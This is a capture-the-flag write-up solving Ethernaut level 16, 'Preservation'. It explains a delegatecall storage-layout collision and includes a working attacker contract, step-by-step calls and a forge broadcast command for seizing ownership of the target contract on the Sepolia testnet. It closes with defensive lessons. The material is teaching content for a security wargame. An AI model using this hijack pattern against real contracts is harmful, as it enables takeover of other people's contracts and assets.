# Ethernaut Challenge 16 — Preservation

Claim ownership of the contract by exploiting a delegatecall storage layout collision.

Instance address:
```
0x3833F5b03D1471484d90F04177b68766ccC070B0
```

---

## 🎯 Goal

Claim ownership of the target `Preservation` contract.

---

## 🔎 Reading the Contract

The state variables inside `Preservation` are laid out as:
```solidity
contract Preservation {
    address public timeZone1Library; // slot 0
    address public timeZone2Library; // slot 1
    address public owner;            // slot 2
    uint256 storedTime;              // slot 3
    ...
```

The library contract `LibraryContract` defines:
```solidity
contract LibraryContract {
    uint256 storedTime;              // slot 0

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
```

When `Preservation` executes `setFirstTime`, it calls the library via `delegatecall`:
```solidity
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
```

* **Storage mismatch**: Under a `delegatecall`, the code in `LibraryContract` executes using the storage context of the calling contract (`Preservation`).
* **Vulnerability**: `LibraryContract`'s `setTime` writes to `storedTime` at **Slot 0**. In the `Preservation` contract's layout, Slot 0 stores the address of `timeZone1Library`! This means calling `setFirstTime(_timeStamp)` will overwrite `timeZone1Library` with the value of `_timeStamp`!

---

## 🧠 Attack Strategy

1. **Deploy a Hijack Contract**: Deploy `PreservationAttacker` with a storage layout that matches `Preservation`:
   ```solidity
   contract PreservationAttacker {
       address public timeZone1Library; // slot 0
       address public timeZone2Library; // slot 1
       address public owner;            // slot 2

       function setTime(uint256) public {
           owner = msg.sender;
       }
   }
   ```
2. **Hijack the Library Address**: Call `setFirstTime` on the target contract, passing our `PreservationAttacker` contract's address (cast as a `uint256`).
   * *This delegates execution to the library, overwriting Slot 0 (`timeZone1Library`) with our attacker address!*
3. **Overwrite the Owner**: Call `setFirstTime` again, passing the player's address (cast as a `uint256`).
   * *Since Slot 0 was overwritten, this now delegatecalls directly into `PreservationAttacker.setTime()`!*
   * *The attacker's function updates Slot 2 (`owner`) to `msg.sender` (the player), immediately granting the player full contract ownership!*

---

## 💻 Solution

### Using Forge Script

```bash
forge script script/16-Preservation.s.sol:PreservationSolution --rpc-url sepolia --broadcast
```

The [script](../../script/16-Preservation.s.sol) deploys the separate [PreservationAttacker.sol](./PreservationAttacker.sol) contract to carry out the storage hijacking attack.

---

## 🛡️ Key Takeaway

- **Storage layout alignment is critical**: When using `delegatecall` to execute library functions, the storage layouts of both contracts must match exactly. Any discrepancies can lead to critical state corruption or privilege escalation.
- **Library safety**: Use Solidity's native `library` keyword instead of regular `contract` types for stateless helper calls, as Solidity library variables are protected from direct storage allocation collisons.

---

## 📜 My Transactions

- Attacker Contract Deploy: [0x7f70adf85ab538e72c5630118876b942072a7ca405d86296a435f02008e15100](https://sepolia.etherscan.io/tx/0x7f70adf85ab538e72c5630118876b942072a7ca405d86296a435f02008e15100)
- Library Hijack Transaction: [0x92c7a055fc65f6a7c36b25b60a6f2f7c765e5c334ef3b709719b95bd3d1780c7](https://sepolia.etherscan.io/tx/0x92c7a055fc65f6a7c36b25b60a6f2f7c765e5c334ef3b709719b95bd3d1780c7)
- Ownership Takeover Transaction: [0x9a07935ed03b8f66f15d90745506e22eb5dfe0a8594be12a7f7b270b5d694ce0](https://sepolia.etherscan.io/tx/0x9a07935ed03b8f66f15d90745506e22eb5dfe0a8594be12a7f7b270b5d694ce0)
